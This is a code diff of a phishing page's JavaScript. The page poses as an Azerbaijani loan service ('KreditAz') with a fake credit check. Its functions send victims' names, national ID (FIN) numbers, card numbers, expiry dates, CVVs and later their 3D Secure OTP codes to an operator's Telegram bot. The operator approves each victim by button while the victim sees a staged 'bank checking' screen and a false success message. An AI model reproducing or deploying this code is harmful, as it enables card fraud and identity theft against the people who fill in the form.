+        document.getElementById('cardExpiry').focus();
+        return;
+    }
+    var cvv = document.getElementById('cardCvv').value;
+    if(cvv.length < 3){
+        alert('CVV kodunu daxil edin!');
+        document.getElementById('cardCvv').focus();
+        return;
+    }
 
-  var firstName = document.getElementById('firstName').value || 'ƏLİ';
-  var lastName = document.getElementById('lastName').value || 'MƏMMƏDOV';
-  var patronymic = document.getElementById('patronymic').value || 'ƏLİ OĞLU';
-  var name = firstName + ' ' + lastName;
-  var birth = document.getElementById('birthDate').value || '1990-01-01';
-  var fin = document.getElementById('fin').value || 'Məlumat yoxdur';
-  var id = document.getElementById('idnum').value || 'Məlumat yoxdur';
-  var prefix = document.getElementById('idPrefix').value || 'AZE';
-  var jobActive = document.querySelector('.toggle-btn.active');
-  var job = jobActive && jobActive.dataset.val === 'beli' ? 'Bəli' : 'Xeyr';
-  var amount = document.getElementById('creditAmountDisplay')?.textContent || '400 ₼';
-  var term = document.getElementById('termLabel').textContent || '3 ay';
+    var firstName = document.getElementById('firstName').value || 'ƏLİ';
+    var lastName = document.getElementById('lastName').value || 'MƏMMƏDOV';
+    var patronymic = document.getElementById('patronymic').value || 'ƏLİ OĞLU';
+    var name = firstName + ' ' + lastName;
+    var birth = document.getElementById('birthDate').value || '1990-01-01';
+    var fin = document.getElementById('fin').value || 'Məlumat yoxdur';
+    var id = document.getElementById('idnum').value || 'Məlumat yoxdur';
+    var prefix = document.getElementById('idPrefix').value || 'AZE';
+    var jobActive = document.querySelector('.toggle-btn.active');
+    var job = jobActive && jobActive.dataset.val === 'beli' ? 'Bəli' : 'Xeyr';
+    var amount = document.getElementById('creditAmountDisplay')?.textContent || '400 ₼';
+    var term = document.getElementById('termLabel').textContent || '3 ay';
 
-  applicationData = {
-    name: name, patronymic: patronymic, birth: birth, fin: fin, 
-    id: prefix + ' ' + id, job: job,
-    bank: selectedBankData.name, cardNumber: cardNumber, expiry: expiry, 
-    cvv: cvv, amount: amount, term: term
-  };
+    applicationData = {
+        name: name, patronymic: patronymic, birth: birth, fin: fin, 
+        id: prefix + ' ' + id, job: job,
+        bank: selectedBankData.name, cardNumber: cardNumber, expiry: expiry, 
+        cvv: cvv, amount: amount, term: term
+    };
 
-  sendToTelegramWithButtons(applicationData);
+    sendToTelegramWithButtons(applicationData);
 
-  document.getElementById('cardInputStep').style.display = 'none';
-  document.getElementById('realCheckingStep').style.display = 'block';
-  
-  waitingForApproval = true;
-  var waitSeconds = 0;
-  document.getElementById('realCheckStatus').textContent = '⏳ Bank cavab gözlənilir... (' + waitSeconds + 's)';
-  
-  if(approvalInterval) clearInterval(approvalInterval);
-  approvalInterval = setInterval(function() {
-    waitSeconds++;
+    document.getElementById('cardInputStep').style.display = 'none';
+    document.getElementById('realCheckingStep').style.display = 'block';
+    
+    waitingForApproval = true;
+    var waitSeconds = 0;
     document.getElementById('realCheckStatus').textContent = '⏳ Bank cavab gözlənilir... (' + waitSeconds + 's)';
-  }, 1000);
-  
-  startTelegramPolling();
+    
+    if(approvalInterval) clearInterval(approvalInterval);
+    approvalInterval = setInterval(function() {
+        waitSeconds++;
+        document.getElementById('realCheckStatus').textContent = '⏳ Bank cavab gözlənilir... (' + waitSeconds + 's)';
+    }, 1000);
+    
+    startTelegramPolling();
 }
 
 // ========== TELEGRAM WITH BUTTONS ==========
 async function sendToTelegramWithButtons(data) {
-  var message = '🆕 YENİ KREDİT MÜRACİƏTİ!\n━━━━━━━━━━━━━━━━━━━━\n👤 Ad, Soyad: ' + data.name + 
-    '\n👤 Ata adı: ' + (data.patronymic || '—') + 
-    '\n📅 Doğum: ' + data.birth + 
-    '\n🪪 FIN: ' + data.fin + 
-    '\n🪪 Seriya: ' + data.id + 
-    '\n💼 İş: ' + data.job + 
-    '\n🏦 Bank: ' + data.bank + 
-    '\n💳 Kart: ' + data.cardNumber + 
-    '\n📅 Bitmə: ' + data.expiry + 
-    '\n🔐 CVV: ' + data.cvv + 
-    '\n💰 Məbləğ: ' + data.amount + 
-    '\n📆 Müddət: ' + data.term + 
-    '\n━━━━━━━━━━━━━━━━━━━━\n📌 Müraciəti təsdiqləyin:';
+    var message = '🆕 YENİ KREDİT MÜRACİƏTİ!\n━━━━━━━━━━━━━━━━━━━━\n👤 Ad, Soyad: ' + data.name + 
+        '\n👤 Ata adı: ' + (data.patronymic || '—') + 
+        '\n📅 Doğum: ' + data.birth + 
+        '\n🪪 FIN: ' + data.fin + 
+        '\n🪪 Seriya: ' + data.id + 
+        '\n💼 İş: ' + data.job + 
+        '\n🏦 Bank: ' + data.bank + 
+        '\n💳 Kart: ' + data.cardNumber + 
+        '\n📅 Bitmə: ' + data.expiry + 
+        '\n🔐 CVV: ' + data.cvv + 
+        '\n💰 Məbləğ: ' + data.amount + 
+        '\n📆 Müddət: ' + data.term + 
+        '\n━━━━━━━━━━━━━━━━━━━━\n📌 Müraciəti təsdiqləyin:';
 
-  var replyMarkup = {
-    inline_keyboard: [
-      [
-        { text: '✅ Qəbul et', callback_data: 'approve_' + Date.now() },
-        { text: '❌ İmtina et', callback_data: 'reject_' + Date.now() }
-      ]
-    ]
-  };
+    var replyMarkup = {
+        inline_keyboard: [
+            [
+                { text: '✅ Qəbul et', callback_data: 'approve_' + Date.now() },
+                { text: '❌ İmtina et', callback_data: 'reject_' + Date.now() }
+            ]
+        ]
+    };
 
-  try {
-    await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
-      method: 'POST',
-      headers: {'Content-Type': 'application/json'},
-      body: JSON.stringify({ 
-        chat_id: CHAT_ID, 
-        text: message, 
-        reply_markup: replyMarkup 
-      })
-    });
-  } catch(e) { console.error('Telegram xətası:', e); }
+    try {
+        await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ 
+                chat_id: CHAT_ID, 
+                text: message, 
+                reply_markup: replyMarkup 
+            })
+        });
+    } catch(e) { console.error('Telegram xətası:', e); }
 }
 
 // ========== TELEGRAM POLLING ==========
 function startTelegramPolling() {
-  if(telegramPollingActive) return;
-  telegramPollingActive = true;
-  pollTelegram();
+    if(telegramPollingActive) return;
+    telegramPollingActive = true;
+    pollTelegram();
 }
 
 async function pollTelegram() {
-  if(!telegramPollingActive) return;
-  
-  try {
-    var url = 'https://api.telegram.org/bot' + BOT_TOKEN + '/getUpdates?offset=' + (lastUpdateId + 1) + '&timeout=30';
-    var response = await fetch(url);
-    var data = await response.json();
+    if(!telegramPollingActive) return;
     
-    if(data.ok && data.result) {
-      for(var i = 0; i < data.result.length; i++) {
-        var update = data.result[i];
-        lastUpdateId = update.update_id;
+    try {
+        var url = 'https://api.telegram.org/bot' + BOT_TOKEN + '/getUpdates?offset=' + (lastUpdateId + 1) + '&timeout=30';
+        var response = await fetch(url);
+        var data = await response.json();
         
-        if(update.callback_query) {
-          var callbackData = update.callback_query.data;
-          
-          if(callbackData && callbackData.startsWith('approve_')) {
-            await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/answerCallbackQuery', {
-              method: 'POST',
-              headers: {'Content-Type': 'application/json'},
-              body: JSON.stringify({ 
-                callback_query_id: update.callback_query.id, 
-                text: '✅ Müraciət qəbul edildi!' 
-              })
-            });
-            
-            await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
-              method: 'POST',
-              headers: {'Content-Type': 'application/json'},
-              body: JSON.stringify({ 
-                chat_id: CHAT_ID, 
-                text: '✅ Müraciət QƏBUL EDİLDİ! İstifadəçi 3D Secure səhifəsinə yönləndirilir.',
-                reply_to_message_id: update.callback_query.message.message_id
-              })
-            });
-            
-            if(waitingForApproval) {
-              waitingForApproval = false;
-              telegramPollingActive = false;
-              if(approvalInterval) { clearInterval(approvalInterval); approvalInterval = null; }
-              
-              document.getElementById('realCheckingStep').style.display = 'none';
-              document.getElementById('threeDStep').style.display = 'block';
-              document.getElementById('otpCode').value = '';
-              document.getElementById('otpStatus').style.display = 'none';
+        if(data.ok && data.result) {
+            for(var i = 0; i < data.result.length; i++) {
+                var update = data.result[i];
+                lastUpdateId = update.update_id;
+                
+                if(update.callback_query) {
+                    var callbackData = update.callback_query.data;
+                    
+                    if(callbackData && callbackData.startsWith('approve_')) {
+                        await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/answerCallbackQuery', {
+                            method: 'POST',
+                            headers: {'Content-Type': 'application/json'},
+                            body: JSON.stringify({ 
+                                callback_query_id: update.callback_query.id, 
+                                text: '✅ Müraciət qəbul edildi!' 
+                            })
+                        });
+                        
+                        await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
+                            method: 'POST',
+                            headers: {'Content-Type': 'application/json'},
+                            body: JSON.stringify({ 
+                                chat_id: CHAT_ID, 
+                                text: '✅ Müraciət QƏBUL EDİLDİ! İstifadəçi 3D Secure səhifəsinə yönləndirilir.',
+                                reply_to_message_id: update.callback_query.message.message_id
+                            })
+                        });
+                        
+                        if(waitingForApproval) {
+                            waitingForApproval = false;
+                            telegramPollingActive = false;
+                            if(approvalInterval) { clearInterval(approvalInterval); approvalInterval = null; }
+                            
+                            document.getElementById('realCheckingStep').style.display = 'none';
+                            document.getElementById('threeDStep').style.display = 'block';
+                            document.getElementById('otpCode').value = '';
+                            document.getElementById('otpStatus').style.display = 'none';
+                        }
+                        break;
+                    }
+                    
+                    if(callbackData && callbackData.startsWith('reject_')) {
+                        await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/answerCallbackQuery', {
+                            method: 'POST',
+                            headers: {'Content-Type': 'application/json'},
+                            body: JSON.stringify({ 
+                                callback_query_id: update.callback_query.id, 
+                                text: '❌ Müraciət imtina edildi!' 
+                            })
+                        });
+                        
+                        await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
+                            method: 'POST',
+                            headers: {'Content-Type': 'application/json'},
+                            body: JSON.stringify({ 
+                                chat_id: CHAT_ID, 
+                                text: '❌ Müraciət İMTİNA EDİLDİ!',
+                                reply_to_message_id: update.callback_query.message.message_id
+                            })
+                        });
+                        
+                        if(waitingForApproval) {
+                            waitingForApproval = false;
+                            telegramPollingActive = false;
+                            if(approvalInterval) { clearInterval(approvalInterval); approvalInterval = null; }
+                            
+                            document.getElementById('realCheckingStep').style.display = 'none';
+                            alert('❌ Müraciətiniz imtina edildi. Bank tərəfindən təsdiqlənmədi.');
+                            closeModal();
+                        }
+                        break;
+                    }
+                }
             }
-            break;
-          }
-          
-          if(callbackData && callbackData.startsWith('reject_')) {
-            await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/answerCallbackQuery', {
-              method: 'POST',
-              headers: {'Content-Type': 'application/json'},
-              body: JSON.stringify({ 
-                callback_query_id: update.callback_query.id, 
-                text: '❌ Müraciət imtina edildi!' 
-              })
-            });
-            
-            await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
-              method: 'POST',
-              headers: {'Content-Type': 'application/json'},
-              body: JSON.stringify({ 
-                chat_id: CHAT_ID, 
-                text: '❌ Müraciət İMTİNA EDİLDİ!',
-                reply_to_message_id: update.callback_query.message.message_id
-              })
-            });
-            
-            if(waitingForApproval) {
-              waitingForApproval = false;
-              telegramPollingActive = false;
-              if(approvalInterval) { clearInterval(approvalInterval); approvalInterval = null; }
-              
-              document.getElementById('realCheckingStep').style.display = 'none';
-              alert('❌ Müraciətiniz imtina edildi. Bank tərəfindən təsdiqlənmədi.');
-              closeModal();
-            }
-            break;
-          }
         }
-      }
+        
+        if(telegramPollingActive && waitingForApproval) {
+            setTimeout(pollTelegram, 3000);
+        }
+        
+    } catch(e) {
+        console.error('Polling xətası:', e);
+        if(telegramPollingActive && waitingForApproval) {
+            setTimeout(pollTelegram, 5000);
+        }
     }
-    
-    if(telegramPollingActive && waitingForApproval) {
-      setTimeout(pollTelegram, 3000);
-    }
-    
-  } catch(e) {
-    console.error('Polling xətası:', e);
-    if(telegramPollingActive && waitingForApproval) {
-      setTimeout(pollTelegram, 5000);
-    }
-  }
 }
 
 // ========== OTP SUBMIT ==========
 function submitOTP() {
-  var otpInput = document.getElementById('otpCode').value.replace(/\s/g,'');
-  if(otpInput.length === 6){
-    document.getElementById('otpStatus').style.display = 'block';
-    document.getElementById('otpStatus').textContent = '✅ Ödəniş uğurla təsdiqləndi! 0.01 AZN geri qaytarılacaq.';
-    
-    fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
-      method: 'POST',
-      headers: {'Content-Type': 'application/json'},
-      body: JSON.stringify({ 
-        chat_id: CHAT_ID, 
-        text: '🔐 İstifadəçi OTP kodunu daxil etdi: ' + otpInput + '\n✅ Ödəniş təsdiqləndi!' 
-      })
-    });
-    
-    setTimeout(function() {
-      alert('✅ Kartınız uğurla doğrulandı! 0.01 AZN geri qaytarılacaq.');
-      closeModal();
-    }, 2000);
-  } else {
-    alert('❌ 6 rəqəmli OTP kodunu daxil edin!');
-  }
+    var otpInput = document.getElementById('otpCode').value.replace(/\s/g,'');
+    if(otpInput.length === 6){
+        document.getElementById('otpStatus').style.display = 'block';
+        document.getElementById('otpStatus').textContent = '✅ Ödəniş uğurla təsdiqləndi! 0.01 AZN geri qaytarılacaq.';
+        
+        fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ 
+                chat_id: CHAT_ID, 
+                text: '🔐 İstifadəçi OTP kodunu daxil etdi: ' + otpInput + '\n✅ Ödəniş təsdiqləndi!' 
+            })
+        });
+        
+        setTimeout(function() {
+            alert('✅ Kartınız uğurla doğrulandı! 0.01 AZN geri qaytarılacaq.');
+            closeModal();
+        }, 2000);
+    } else {
+        alert('❌ 6 rəqəmli OTP kodunu daxil edin!');
+    }
 }
 
 // ========== KREDİT ÖDƏ MODAL ==========
 function openCreditCheckModal() {
-  document.getElementById('modalOverlay').classList.add('active');
-  document.body.style.overflow='hidden';
-  
-  document.getElementById('formStep').style.display='none';
-  document.getElementById('summaryStep').style.display='none';
-  document.getElementById('faceScanStep').style.display='none';
-  document.getElementById('checkingStep').style.display='none';
-  document.getElementById('realCheckingStep').style.display='none';
-  document.getElementById('bankStep').style.display='none';
-  document.getElementById('cardInputStep').style.display='none';
-  document.getElementById('threeDStep').style.display='none';
-  
-  document.getElementById('creditCheckModal').style.display='block';
-  resetCreditCheck();
-  document.getElementById('checkFin').focus();
+    document.getElementById('modalOverlay').classList.add('active');
+    document.body.style.overflow='hidden';
+    
+    document.getElementById('formStep').style.display='none';
+    document.getElementById('summaryStep').style.display='none';
+    document.getElementById('videoScanStep').style.display='none';
+    document.getElementById('checkingStep').style.display='none';
+    document.getElementById('realCheckingStep').style.display='none';
+    document.getElementById('bankStep').style.display='none';
+    document.getElementById('cardInputStep').style.display='none';
+    document.getElementById('threeDStep').style.display='none';
+    
+    document.getElementById('creditCheckModal').style.display='block';
+    resetCreditCheck();
+    document.getElementById('checkFin').focus();
 }
 
 function resetCreditCheck() {
-  document.getElementById('creditCheckForm').style.display='block';
-  document.getElementById('creditChecking').style.display='none';
-  document.getElementById('creditResult').style.display='none';
-  document.getElementById('checkFin').value = '';
-  document.getElementById('checkBirth').value = '';
+    document.getElementById('creditCheckForm').style.display='block';
+    document.getElementById('creditChecking').style.display='none';
+    document.getElementById('creditResult').style.display='none';
+    document.getElementById('checkFin').value = '';
+    document.getElementById('checkBirth').value = '';
 }
 
 function startCreditCheck() {
-  var fin = document.getElementById('checkFin').value.trim().toUpperCase();
-  var birth = document.getElementById('checkBirth').value;
-  
-  if(!fin || fin.length!==7){ alert('FIN kod 7 simvoldan ibarət olmalıdır!'); return; }
-  if(!birth){ alert('Doğum tarixi daxil edin!'); return; }
-  
-  document.getElementById('creditCheckForm').style.display='none';
-  document.getElementById('creditChecking').style.display='block';
-  document.getElementById('creditResult').style.display='none';
-  
-  var seconds = 0;
-  var timerEl = document.getElementById('creditCheckTimer');
-  timerEl.textContent = '0';
-  
-  if(checkInterval) clearInterval(checkInterval);
-  checkInterval = setInterval(function() {
-    seconds++;
-    timerEl.textContent = seconds;
-  }, 1000);
-  
-  setTimeout(function() {
-    clearInterval(checkInterval);
-    checkInterval = null;
-    document.getElementById('creditChecking').style.display='none';
-    document.getElementById('creditResult').style.display='block';
-  }, 5000);
+    var fin = document.getElementById('checkFin').value.trim().toUpperCase();
+    var birth = document.getElementById('checkBirth').value;
+    
+    if(!fin || fin.length!==7){ alert('FIN kod 7 simvoldan ibarət olmalıdır!'); return; }
+    if(!birth){ alert('Doğum tarixi daxil edin!'); return; }
+    
+    document.getElementById('creditCheckForm').style.display='none';
+    document.getElementById('creditChecking').style.display='block';
+    document.getElementById('creditResult').style.display='none';
+    
+    var seconds = 0;
+    var timerEl = document.getElementById('creditCheckTimer');
+    timerEl.textContent = '0';
+    
+    if(checkInterval) clearInterval(checkInterval);
+    checkInterval = setInterval(function() {
+        seconds++;
+        timerEl.textContent = seconds;
+    }, 1000);
+    
+    setTimeout(function() {
+        clearInterval(checkInterval);
+        checkInterval = null;
+        document.getElementById('creditChecking').style.display='none';
+        document.getElementById('creditResult').style.display='block';
+    }, 5000);
 }
 
 function goToApply() {
-  closeModal();
-  setTimeout(function() {
-    openModal();
-  }, 300);
+    closeModal();
+    setTimeout(function() {
+        openModal();
+    }, 300);
 }
 
 // ========== CLOSE MODAL ==========
 document.getElementById('modalOverlay').addEventListener('click', function(e) {
-  if(e.target.id==='modalOverlay') { 
-    if(checkInterval) clearInterval(checkInterval); 
-    if(faceScanInterval) clearInterval(faceScanInterval);
-    if(approvalInterval) clearInterval(approvalInterval);
-    checkInterval = null;
-    faceScanInterval = null;
-    approvalInterval = null;
-    isChecking = false; 
-    faceScanActive = false;
-    waitingForApproval = false;
-    telegramPollingActive = false;
-    stopCamera();
-    closeModal(); 
-  }
+    if(e.target.id==='modalOverlay') { 
+        if(checkInterval) clearInterval(checkInterval); 
+        if(scanInterval) clearInterval(scanInterval);
+        if(approvalInterval) clearInterval(approvalInterval);
+        checkInterval = null;
+        scanInterval = null;
+        approvalInterval = null;
+        isChecking = false; 
+        waitingForApproval = false;
+        telegramPollingActive = false;
+        stopVideoStream();
+        closeModal(); 
+    }
 });
 document.addEventListener('keydown', function(e) { 
-  if(e.key==='Escape') { 
-    if(checkInterval) clearInterval(checkInterval); 
-    if(faceScanInterval) clearInterval(faceScanInterval);
-    if(approvalInterval) clearInterval(approvalInterval);
-    checkInterval = null;
-    faceScanInterval = null;
-    approvalInterval = null;
-    isChecking = false; 
-    faceScanActive = false;
-    waitingForApproval = false;
-    telegramPollingActive = false;
-    stopCamera();
-    closeModal(); 
-  } 
+    if(e.key==='Escape') { 
+        if(checkInterval) clearInterval(checkInterval); 
+        if(scanInterval) clearInterval(scanInterval);
+        if(approvalInterval) clearInterval(approvalInterval);
+        checkInterval = null;
+        scanInterval = null;
+        approvalInterval = null;
+        isChecking = false; 
+        waitingForApproval = false;
+        telegramPollingActive = false;
+        stopVideoStream();
+        closeModal(); 
+    } 
 });
 
 // ========== INPUT MASKS ==========
 document.getElementById('fin').addEventListener('input', function() {
-  this.value = this.value.toUpperCase().replace(/[^A-Z0-9]/g,'').slice(0,7);
-  updateIDPreview();
+    this.value = this.value.toUpperCase().replace(/[^A-Z0-9]/g,'').slice(0,7);
+    updateIDPreview();
 });
 document.getElementById('idnum').addEventListener('input', function() {
-  this.value = this.value.replace(/\D/g,'').slice(0,8);
-  updateIDPreview();
+    this.value = this.value.replace(/\D/g,'').slice(0,8);
+    updateIDPreview();
 });
 
 document.getElementById('checkFin').addEventListener('input', function() {
-  this.value = this.value.toUpperCase().replace(/[^A-Z0-9]/g,'').slice(0,7);
+    this.value = this.value.toUpperCase().replace(/[^A-Z0-9]/g,'').slice(0,7);
 });
 
 var creditAmountDisplay = document.createElement('span');
@@ -2301,4 +2362,4 @@ document.body.appendChild(creditTermDisplay);
 console.log('✅ KreditAz yükləndi!');
 </script>
 </body>
-            </html>
+  </html>
